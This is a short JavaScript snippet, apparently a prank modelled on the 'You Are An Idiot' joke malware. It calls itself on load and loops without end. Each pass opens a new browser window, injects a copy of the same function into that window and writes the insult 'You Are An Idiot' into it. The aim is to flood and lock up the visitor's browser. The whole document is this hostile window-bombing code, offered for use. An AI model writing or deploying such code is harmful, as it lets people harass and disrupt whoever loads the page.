function spammer(){
  while(true){
  wind = window.open()
  script = wind.document.createElement('script')
  script.innerHTML = 'wind.onload = ' + spammer.toString() + ';';
  wind.document.body.appendChild(script)
  idiot = wind.document.createTextNode("You Are An Idiot")
  wind.document.body.appendChild(idiot)
  }
}

spammer()
